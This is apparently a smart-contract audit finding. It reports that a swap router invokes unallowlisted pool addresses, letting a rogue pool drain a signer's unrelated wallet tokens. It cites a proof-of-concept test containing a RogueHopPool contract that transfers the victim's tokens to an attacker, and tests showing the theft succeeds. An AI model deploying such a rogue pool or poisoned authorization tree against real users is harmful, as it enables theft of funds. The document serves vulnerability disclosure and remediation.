### Title
Unrestricted pool addresses in swap routes let arbitrary contracts ride the caller's auth tree and drain unrelated wallet tokens - ([File: contracts/swap-aggregator/src/execute/mod.rs])

### Summary
The `web3-eht` class — malicious embedded code that exfiltrates a victim's wallet — maps onto XOXNO's router: `execute_strategy` resolves `hop.pool` directly from the caller-supplied `assets` registry and invokes it, with no allowlist of pool or token addresses. A rogue "pool" contract placed in a route runs arbitrary code inside the same transaction as `sender.require_auth()`, and any `token.transfer(sender, attacker, x)` it makes is recorded by simulation as a child of the sender's authorization entry. If the sender signs the simulated tree — the standard wallet flow — the rogue pool steals any token the sender holds, not just the routed `total_in`.

### Finding Description
`execute_op` builds `SwapHop { pool: ctx.assets.get_unchecked(op.idx_a), ... }` purely from payload indices, and `venues::dispatch_hop` invokes that address (`invoke_contract(&pool, "swap", ...)` for Phoenix/Aquarius, equivalent for Soroswap/Sushi/Comet). The project threat model confirms the router "calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization. A token transfer that such code makes from the caller is recorded by an honest simulation as a child of the caller's authorization entry, and it executes if the caller signs that tree. The loss is then the caller's wallet, not the routed amount." [1](#0-0) 

The harness proves it end-to-end: `RogueHopPool::swap` calls `token::Client::transfer(&victim, &attacker, &amount)` on an unrelated wallet token, and in recording mode the stolen transfer is nested under the caller's `swap_collateral` root; in enforcing mode the honest root-only tree is refused, while the simulated poisoned tree executes and Alice's wallet token balance goes to the attacker. [2](#0-1) [3](#0-2) [4](#0-3) 

Nothing on-chain bounds the blast radius: the measured input credit, per-hop `spent != amount_in` check, `min_out` check, and residual cap all only constrain tokens the router itself holds — the rogue transfer is a side-effect on the sender's account that none of these measure. [5](#0-4) 

### Impact Explanation
Theft of user funds. A victim signing a route (standalone `execute_strategy`, or a controller strategy — `multiply`, `swap_collateral`, `swap_debt`, `repay_debt_with_collateral` — since the controller's `sender` auth covers the same tree) can lose every token in their wallet in one transaction, far exceeding `total_in`. Neither the route `min_out` nor the controller's post-swap risk gates detect or bound the loss.

### Likelihood Explanation
Exploitation requires getting a victim to sign a poisoned auth tree — e.g., a malicious/compromised route provider or a phishing-crafted `routeXdr`. Simulation faithfully records the rogue transfer, so a careful client could detect it, but wallets and SDKs commonly auto-attach simulated auth without diffing child invocations, and the threat model itself notes the mitigation is client-side only ("a client must decode the route it signs and refuse an authorization tree with any other child"). [6](#0-5)  Rated Medium-High likelihood / Critical impact → High overall.

### Recommendation
- Maintain an on-chain allowlist (or registry-signed set) of approved pool contract addresses per venue, and reject routes naming unlisted pools in `dispatch_hop`.
- Alternatively, sandbox venue calls so only invoker-contract auth exists below the router: e.g., execute hops in a sub-invocation that cannot inherit the sender's auth context, or require venues to pull via `authorize_as_current_contract` only (already done) plus verify no other `require_auth`/`transfer` from `sender` occurred.
- At minimum, ship/enforce the client-side invariant: the signed auth tree for a swap may contain only the single `token_in.transfer(sender, router, total_in)` child; reject any simulation output with additional children.

### Proof of Concept
`tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` is a complete PoC: `Scene::route_through_pool_stealing(WALLET_BALANCE)` builds a route whose `hop_pool` is an attacker-deployed `RogueHopPool` preconfigured with `(victim=alice, wallet_token, to=attacker, amount)`. `simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry` shows the recorded auth tree nests the wallet drain under Alice's `swap_collateral` entry and leaves Alice at 0 wallet balance while the swap itself pays out fairly; `enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer` shows the honest tree is refused but the simulation-produced poisoned tree executes the theft. The same payload flows through the real router because `execute_op`/`dispatch_hop` never validate `hop.pool` against any list. [7](#0-6)

### Citations

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-72)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-269)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L42-58)
```rust
    let received = ctx
        .output_balance()
        .checked_sub(before_out)
        .unwrap_or_else(|| panic_with_error!(env, Error::ZeroOutput));
    if received <= 0 {
        panic_with_error!(env, Error::ZeroOutput);
    }

    let after_in = ctx.input_balance();
    let spent = before_in
        .checked_sub(after_in)
        .unwrap_or_else(|| panic_with_error!(env, Error::InvalidAmount));
    if spent != amount_in {
        panic_with_error!(env, Error::InvalidAmount);
    }

    received
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L152-170)
```rust
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
            if out <= 0 {
                panic_with_error!(ctx.env, Error::ZeroOutput);
            }
            vault.deposit(&hop.token_out, out);
            Some((hop.token_out, out))
```
